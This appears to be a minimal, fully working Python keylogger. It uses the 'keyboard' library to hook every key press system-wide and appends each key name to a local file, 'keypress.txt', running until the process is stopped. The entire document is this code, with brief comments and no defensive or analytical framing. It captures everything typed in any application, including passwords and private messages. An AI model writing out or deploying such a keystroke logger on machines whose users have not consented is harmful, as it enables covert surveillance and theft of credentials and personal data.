import keyboard

# file to store what's typed
log_file = 'keypress.txt'

# when key pressed, open temp file and write key pressed to said file
def key_pressed(event):
    with open(log_file, 'a') as k:
        k.write('{}\n'.format(event.name))

# call key pressed event function when key is pressed
keyboard.on_press(key_pressed)

# wait til press then exit
keyboard.wait()